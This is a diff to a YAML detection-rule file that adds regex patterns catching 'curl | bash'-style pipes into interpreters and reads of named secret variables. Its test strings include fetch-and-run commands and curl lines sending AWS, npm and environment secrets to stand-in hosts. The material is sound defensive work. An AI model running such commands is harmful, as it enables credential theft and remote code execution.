@@ -97,13 +97,29 @@ rules:
         - '\b(?:ba|z|k)?sh\s+-c\b'
         - '\bStart-Process\b'
         - '\bnohup\b|\bsetsid\b'
+        # A pipe into an interpreter. This was absent, so `curl ... | bash` --
+        # the single most recognisable line in the supply-chain attack
+        # literature -- produced no spawn label, left the egress label with no
+        # partner, and fired no composite. It was caught inside a Dockerfile or
+        # a workflow by a path-scoped rule, and missed in the plain `.sh`
+        # install script where it actually lands.
+        - '\|\s*(?:sudo\s+)?(?:ba|z|k|da)?sh\b'
+        - '\|\s*(?:sudo\s+)?python[0-9.]*\b'
+        - '\|\s*(?:sudo\s+)?(?:node|perl|ruby|php)\b'
+        - '\|\s*(?:sudo\s+)?tee\s'
+        - '\bIEX\b|\bInvoke-Expression\b'
     tests:
       positive:
         - "output=$(uname -a)"
         - "sh -c 'echo hi'"
+        - "curl -sSL https://example.invalid/x | bash"
+        - "wget -qO- https://example.invalid/x | sudo sh"
+        - "curl https://example.invalid/x | python3"
       negative:
         - "echo 'plain text'"
         - "VERSION=1.2.3"
+        - "cat file | grep pattern"
+        - "ls | wc -l"
 
   - id: CAP.SH.CREDENTIAL.001
     version: 1.0.0
@@ -132,10 +148,21 @@ rules:
         - '\bGet-ChildItem\s+Env:'
         - '\.ssh/id_|\.aws/credentials|\.npmrc|\.netrc|\.docker/config\.json'
         - '\bkubectl\s+get\s+secret'
+        # A *named* secret variable. Only whole-environment dumps were matched,
+        # and reading `$AWS_SECRET_ACCESS_KEY` or `$GITHUB_TOKEN` directly is
+        # the dominant form in CI -- the one an exfiltration script actually
+        # uses, because it is shorter and less conspicuous than dumping
+        # everything.
+        - '\$\{?[A-Za-z_]*(?:TOKEN|SECRET|PASSWORD|PASSWD|APIKEY|API_KEY|CREDENTIAL|PRIVATE_KEY)[A-Za-z_]*\}?'
+        - '\$\{?(?:AWS_ACCESS_KEY_ID|GH_TOKEN|CI_JOB_TOKEN|TWINE_PASSWORD)\}?'
+        - '\bEnv:[A-Za-z_]*(?:TOKEN|SECRET|PASSWORD|KEY)'
     tests:
       positive:
         - "curl -d \"$(env)\" https://x.example"
         - "cat ~/.aws/credentials"
+        - "curl -d \"$AWS_SECRET_ACCESS_KEY\" https://x.example"
+        - "echo $GITHUB_TOKEN | base64"
+        - "curl -H \"Authorization: $NPM_TOKEN\" https://x.example"
       negative:
         - "env NODE_ENV=production npm run build"
         - "environment=staging"
